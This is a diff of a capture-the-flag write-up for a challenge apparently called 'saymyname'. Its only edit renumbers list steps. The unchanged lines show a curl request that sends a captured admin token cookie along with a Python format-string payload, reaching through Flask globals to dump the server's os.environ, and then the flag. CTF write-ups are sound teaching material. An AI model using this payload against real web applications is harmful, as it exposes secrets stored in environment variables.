@@ -219,7 +219,7 @@ Let's do the steps on remote:
 
 We get the token `X-Admin-Token=17c738b0787c99a392debb90bf9b57be`
 
-- Use that token to get the flag from the Python format string vulnerability
+2. Use that token to get the flag from the Python format string vulnerability
 
 ```bash
 $ curl -X GET "https://saymyname-c588791ba9cff43a.deploy.phreaks.fr/admin?prompt=%7B0.__globals__%5BFlask%5D.__init__.__globals__%5Bos%5D.environ%7D" --cookie "X-Admin-Token=17c738b0787c99a392debb90bf9b57be"
@@ -236,6 +236,6 @@ $ curl -X GET "https://saymyname-c588791ba9cff43a.deploy.phreaks.fr/admin?prompt
 </html>
 ```
 
-- Profit
+3. Profit
 
 Flag: `PWNME{b492b312612c741b3b6597f925f88198}`
